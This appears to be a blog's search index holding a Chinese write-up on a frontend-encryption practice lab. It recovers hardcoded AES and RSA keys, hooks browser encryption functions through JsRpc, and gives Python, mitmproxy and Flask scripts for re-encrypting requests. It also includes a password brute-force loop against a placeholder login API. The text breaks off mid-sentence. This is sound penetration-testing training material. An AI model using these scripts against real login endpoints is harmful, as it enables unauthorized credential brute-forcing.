<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>前端加解密靶场练习</title>
      <link href="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/SwagXz/encrypt-labs">https://github.com/SwagXz/encrypt-labs</a> 练习平台</p><p><a href="https://deobfuscate.io/">https://deobfuscate.io/</a> js 反混淆</p><p>看到有师傅搭建了个前端加密练习平台，就对其前端加解密进行学习</p><h2 id="AES-固定-key"><a href="#AES-固定-key" class="headerlink" title="AES 固定 key"></a>AES 固定 key</h2><p>抓包搜索关键字encryptedData定位加密函数</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114115629.png" class=""><p>得到 key 和 iv 为1234567890123456，算法为 aes cbc pkcs7</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114124356.png" class=""><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114131831.png" class=""><h3 id="远程调用-rpc-浏览器方法"><a href="#远程调用-rpc-浏览器方法" class="headerlink" title="远程调用(rpc)浏览器方法"></a>远程调用(rpc)浏览器方法</h3><p><a href="https://github.com/jxhczhl/JsRpc">https://github.com/jxhczhl/JsRpc</a></p><p>1， 先打开客户端，然后打开控制台，将JSrpc的注入代码输入</p><p>2， 然后再输入var demo &#x3D; new Hlclient(“ws:&#x2F;&#x2F;127.0.0.1:12080&#x2F;ws?group&#x3D;zzz”);</p><p>3，记录加密函数 在控制台中输入window.enc &#x3D; sendDataAes， 控制台会显示当前函数信息, 并保存非形参的参数, 注册成功后我们可以主动调用<code>enc()</code>函数, 查看是否有效</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114147268.png" class=""><p>4，向JsRPC中注册这些函数，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">demo.regAction(&quot;sendDataAes&quot;, function (resolve, param) &#123;</span><br><span class="line">    document.getElementById(&quot;username&quot;).value = param[&quot;username&quot;];</span><br><span class="line">    document.getElementById(&quot;password&quot;).value = param[&quot;password&quot;];</span><br><span class="line">    var res = enc(String(param[&quot;url&quot;]));</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>5，测试调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:12080/go&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;group&quot;: &quot;zzz&quot;,</span><br><span class="line">    &quot;action&quot;: &quot;sendDataAes&quot;,</span><br><span class="line">    &quot;param&quot;: json.dumps(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123123&quot;,&quot;url&quot;:&quot;encrypt/aes.php&quot;&#125;)</span><br><span class="line">&#125;</span><br><span class="line">print(data[&quot;param&quot;])</span><br><span class="line">res=requests.post(url, data=data) </span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>发现这样的话如果爆破密码，浏览器会弹窗导致 js 阻塞，中断发包</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114158874.png" class=""><p>可以通过重写 <code>window.alert</code> 方法，阻止弹框的弹出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function() &#123;</span><br><span class="line">  console.log(&quot;原始 alert 被阻止&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>后面可以修改 python 代码进行爆破密码</p><p>如果目标实现的加密函数只实现了加密数据功能，可以参考<a href="https://blog.csdn.net/Dreambooks/article/details/141557717">https://blog.csdn.net/Dreambooks/article/details/141557717</a>文章中的 python 代码进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(data):</span><br><span class="line">    param = quote(data)</span><br><span class="line">    req = requests.get(f&quot;http://127.0.0.1:12080/go?group=encrypt&amp;action=ens&amp;param=&#123;param&#125;&quot;)</span><br><span class="line">    return req.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(data):</span><br><span class="line">    res = requests.get(f&quot;http://127.0.0.1:12080/go?group=encrypt&amp;action=decry&amp;param=&#123;data&#125;&quot;)</span><br><span class="line">    return json.loads(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    for i in range(123450,123460):</span><br><span class="line">        passwd = str(i)</span><br><span class="line">        data = &#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;%s&quot;,&quot;validCode&quot;:&quot;xiaj&quot;&#125;&#x27; % passwd</span><br><span class="line">        print(&quot;=====================请求明文数据=====================&quot;)</span><br><span class="line">        print(data)</span><br><span class="line">        json_data = json.loads(encrypt(data))[&#x27;data&#x27;]</span><br><span class="line">        encrypt_text = json.loads(json_data)</span><br><span class="line">        print(&quot;=====================请求密文数据=====================&quot;)</span><br><span class="line">        print(encrypt_text)</span><br><span class="line">        requestId = encrypt_text[&#x27;id&#x27;]</span><br><span class="line">        sign = encrypt_text[&#x27;sign&#x27;]</span><br><span class="line">        data_en = encrypt_text[&#x27;encrypt_text&#x27;]</span><br><span class="line">        timestamp = encrypt_text[&#x27;timestamp&#x27;]</span><br><span class="line">        url = &quot;http://xxxx/api/user/login&quot;</span><br><span class="line">        headers = &#123;&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;,</span><br><span class="line">                   &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;timestamp&quot;: str(timestamp),</span><br><span class="line">                   &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;requestId&quot;: requestId,</span><br><span class="line">                   &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36&quot;,</span><br><span class="line">                   &quot;sign&quot;: sign, &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;,</span><br><span class="line">                   &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">                   &quot;Connection&quot;: &quot;close&quot;&#125;</span><br><span class="line">        datas = quote(data_en)</span><br><span class="line">        req = requests.post(url, headers=headers, data=data_en).text</span><br><span class="line">        print(&quot;=====================响应密文数据=====================&quot;)</span><br><span class="line">        print(req)</span><br><span class="line">        res_data = decrypt(quote(req))</span><br><span class="line">        print(&quot;=====================响应明文数据=====================&quot;)</span><br><span class="line">        print(res_data[&#x27;data&#x27;])</span><br><span class="line">        code = json.loads(res_data[&#x27;data&#x27;])</span><br><span class="line">        if code[&#x27;code&#x27;] == &#x27;0&#x27;:</span><br><span class="line">            print(&quot;=====================账户爆破成功=====================&quot;)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>如果需要再 bp 中发包明文数据，进行爆破可以参考</p><p><a href="https://xz.aliyun.com/t/12897">https://xz.aliyun.com/t/12897</a></p><p><a href="https://mp.weixin.qq.com/s/_WdQlH6AKma8zYq73Ub7ag">https://mp.weixin.qq.com/s/_WdQlH6AKma8zYq73Ub7ag</a></p><p>使用mitmproxy 代理进行参数加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line">from mitmproxy import ctx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(data):</span><br><span class="line">    data = data.replace(&#x27;&amp;&#x27;, &quot;%26&quot;)</span><br><span class="line">    url = &quot;http://127.0.0.1:5612/business-demo/invoke?group=MN&amp;action=AES&amp;text=&#123;&#125;&quot;.format(</span><br><span class="line">        data)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    res = json.loads(res.text)</span><br><span class="line">    return res[&#x27;data&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def request(flow):</span><br><span class="line">    # 获取GET请求的数据</span><br><span class="line">    data = flow.request.query.get(&#x27;data&#x27;)</span><br><span class="line">    print(&#x27;Get request data ===&gt; &#x27;, data)</span><br><span class="line">    encryptData = encrypt(data)</span><br><span class="line">    print(&#x27;EncryptData ===&gt; &#x27;, encryptData)</span><br><span class="line">    # 设置修改后的请求 body 数据</span><br><span class="line">    flow.request.query[&#x27;data&#x27;] = encryptData</span><br><span class="line">    # url = flow.request.url + &quot;?data=&quot; + encryptData</span><br><span class="line">    # res = requests.get(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 请求后的数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def response(flow):</span><br><span class="line">    response = flow.response</span><br><span class="line">    print(response.text)</span><br><span class="line">    ctx.log.info(str(response.status_code))</span><br></pre></td></tr></table></figure><p>然后启动<br>mitmweb -v -s test.py -p 8081</p><p>将代码运行起来后, burpsuite 的upstream 设为 mitm的监听端口<br>然后尝试发送一个包<br>可以看见BP中明文发送 已经被加密</p><h3 id="Burp插件"><a href="#Burp插件" class="headerlink" title="Burp插件"></a>Burp插件</h3><p><a href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder</a></p><p>这里使用自带算法加解密</p><p>选择 aes cbc 算法，填写 key 和 iv，设置为请求包加解密方式</p><p>然后填写正则表达式为encryptedData&#x3D;(.*)提取出要解密的内容</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114230259.png" class=""><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114239611.png" class=""><p>然后把请求包的密文转换为明文</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114247239.png" class=""><p>就可以直接修改明文了</p><h3 id="接口加解密代码实现"><a href="#接口加解密代码实现" class="headerlink" title="接口加解密代码实现"></a>接口加解密代码实现</h3><p>尝试用上面插件 通过实现 api 接口对请求包进行加密和解密</p><p>现在 iv 和 key 都是1234567890123456 并且知道算法是 aes cbc 加密模式，下面是实现代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from flask import Flask,request</span><br><span class="line">from Cryptodome.Cipher import AES #pip install pycryptodomex</span><br><span class="line">from Cryptodome.Util import Padding</span><br><span class="line">from urllib.parse import unquote,quote</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def aes_encrypt(s):</span><br><span class="line">    secret_key = b&quot;1234567890123456&quot;</span><br><span class="line">    iv = b&quot;1234567890123456&quot;</span><br><span class="line">    k = AES.new(secret_key,AES.MODE_CBC,iv)</span><br><span class="line">    padded_s = Padding.pad(s.encode(&quot;UTF-8&quot;),AES.block_size,&quot;pkcs7&quot;)</span><br><span class="line">    en = k.encrypt(padded_s)</span><br><span class="line">    return quote(base64.encodebytes(en).decode().strip(&quot;\n&quot;))</span><br><span class="line"></span><br><span class="line">def aes_decrypt(s):</span><br><span class="line">    secret_key = b&quot;1234567890123456&quot;</span><br><span class="line">    iv = b&quot;1234567890123456&quot;</span><br><span class="line">    k = AES.new(secret_key,AES.MODE_CBC,iv) #创建 AES 解密器</span><br><span class="line">    encrypted_data = base64.b64decode(s)  #BASE64解码</span><br><span class="line">    # 解密并去除填充</span><br><span class="line">    de = k.decrypt(encrypted_data)</span><br><span class="line">    return Padding.unpad(de, AES.block_size, style=&quot;pkcs7&quot;).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/encode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def encrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    encry_param = aes_encrypt(param.strip(&quot;\n&quot;))</span><br><span class="line">    print(param)</span><br><span class="line">    print(encry_param)</span><br><span class="line">    return &quot;encryptedData=&quot;+encry_param</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/decode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def decrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    match = re.search(r&#x27;encryptedData=(.*)&#x27;,param.strip(&quot;\n&quot;)) # 正则提取密文</span><br><span class="line">    decrypt_param = aes_decrypt(unquote(match.group(1))) # url解码然后传给解密函数</span><br><span class="line">    print(param)</span><br><span class="line">    print(decrypt_param)</span><br><span class="line">    return decrypt_param</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure><p>设置如下 ，就可以直接修改明文进行发包了</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114300660.png" class=""><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114308072.png" class=""><h2 id="AES服务端获取Key"><a href="#AES服务端获取Key" class="headerlink" title="AES服务端获取Key"></a>AES服务端获取Key</h2><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114315673.png" class=""><p>直接填写 key 和 iv 就行，并设置为 base64</p><p>然后修改正则encryptedData”:”(.*)”}</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114322865.png" class=""><h3 id="接口加解密实现"><a href="#接口加解密实现" class="headerlink" title="接口加解密实现"></a>接口加解密实现</h3><p>这里 获取的 key 和 iv 是随机生成然后存放在 session 中的，不会更变</p><p>和上面区别就是需要对 key 和 iv 进行 base64 解码</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114331270.png" class=""><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from flask import Flask,request</span><br><span class="line">from Cryptodome.Cipher import AES #pip install pycryptodomex</span><br><span class="line">from Cryptodome.Util import Padding</span><br><span class="line">from urllib.parse import unquote,quote</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def aes_encrypt(s):</span><br><span class="line">    secret_key = &quot;tNsXedbbDjxfaF2gA5iF3Q==&quot;</span><br><span class="line">    iv = &quot;+xyEomsNd7JazQW6ezTMIg==&quot;</span><br><span class="line">    k = AES.new(base64.b64decode(secret_key),AES.MODE_CBC,base64.b64decode(iv))</span><br><span class="line">    padded_s = Padding.pad(s.encode(&quot;UTF-8&quot;),AES.block_size,&quot;pkcs7&quot;)</span><br><span class="line">    en = k.encrypt(padded_s)</span><br><span class="line">    return base64.encodebytes(en).decode().strip(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def aes_decrypt(s):</span><br><span class="line">    secret_key = &quot;tNsXedbbDjxfaF2gA5iF3Q==&quot;</span><br><span class="line">    iv = &quot;+xyEomsNd7JazQW6ezTMIg==&quot;</span><br><span class="line">    k = AES.new(base64.b64decode(secret_key),AES.MODE_CBC,base64.b64decode(iv)) #创建 AES 解密器</span><br><span class="line">    encrypted_data = base64.b64decode(s)  #BASE64解码</span><br><span class="line">    # 解密并去除填充</span><br><span class="line">    de = k.decrypt(encrypted_data)</span><br><span class="line">    return Padding.unpad(de, AES.block_size, style=&quot;pkcs7&quot;).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/encode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def encrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    encry_param = aes_encrypt(param.strip(&quot;\n&quot;))</span><br><span class="line">    print(param)</span><br><span class="line">    print(encry_param)</span><br><span class="line">    response = &#123;&quot;encryptedData&quot;:encry_param&#125;</span><br><span class="line">    return json.dumps(response)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/decode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def decrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    encryptedData = json.loads(param)[&#x27;encryptedData&#x27;]</span><br><span class="line">    decrypt_param = aes_decrypt(encryptedData) # 调用解密函数</span><br><span class="line">    print(param)</span><br><span class="line">    print(decrypt_param)</span><br><span class="line">    return decrypt_param</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure><h2 id="RSA-加密"><a href="#RSA-加密" class="headerlink" title="RSA 加密"></a>RSA 加密</h2><p>定位加密函数</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114342347.png" class=""><p>获取公钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="line">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="line">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="line">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>这里只能获取到公钥，所以只能修改明文请求包然后对其进行 rsa 加密</p><p>通过查看 js 代码，前端只加密了{“username”:”admin”,”password”:”123456”}这个字符串</p><p>然后修改插件配置为下面就可以直接修改明文请求包了，然后插件对其进行 rsa 加密</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114353769.png" class=""><h3 id="接口加密实现"><a href="#接口加密实现" class="headerlink" title="接口加密实现"></a>接口加密实现</h3><p>前端实现的是PKCS1_v1_5 填充方案，之前一直用PKCS1_OAEP 填充方案弄了半天</p><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from flask import Flask,request</span><br><span class="line">from Cryptodome.PublicKey import RSA</span><br><span class="line">from Cryptodome.Cipher import PKCS1_v1_5</span><br><span class="line">from base64 import b64encode</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 公钥 (PEM 格式)</span><br><span class="line">public_key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="line">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="line">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="line">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def rsa_encrypt(s):</span><br><span class="line">    # 加载公钥</span><br><span class="line">    public_key_obj = RSA.import_key(public_key)</span><br><span class="line"></span><br><span class="line">    # 创建加密对象，使用 PKCS1_v1_5 模式</span><br><span class="line">    cipher = PKCS1_v1_5.new(public_key_obj)</span><br><span class="line"></span><br><span class="line">    # 对明文进行加密</span><br><span class="line">    encrypted_data = cipher.encrypt(s.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">    # 将加密后的数据转为 Base64 编码</span><br><span class="line">    encrypted_base64 = b64encode(encrypted_data).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">    return encrypted_base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/encode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def encrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    encry_param = rsa_encrypt(param.strip(&quot;\n&quot;))</span><br><span class="line">    print(param)</span><br><span class="line">    print(encry_param)</span><br><span class="line">    return &quot;data=&quot;+quote(encry_param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114404809.png" class=""><h2 id="AES-Rsa-加密"><a href="#AES-Rsa-加密" class="headerlink" title="AES+Rsa 加密"></a>AES+Rsa 加密</h2><p>请求包</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114415205.png" class=""><p>搜索encryptedKey，定位到加密函数sendDataAesRsa</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114423766.png" class=""><p>可以看到随机 iv 和 key，然后将 iv 和 key 先 base64 编码然后进行 rsa 加密和 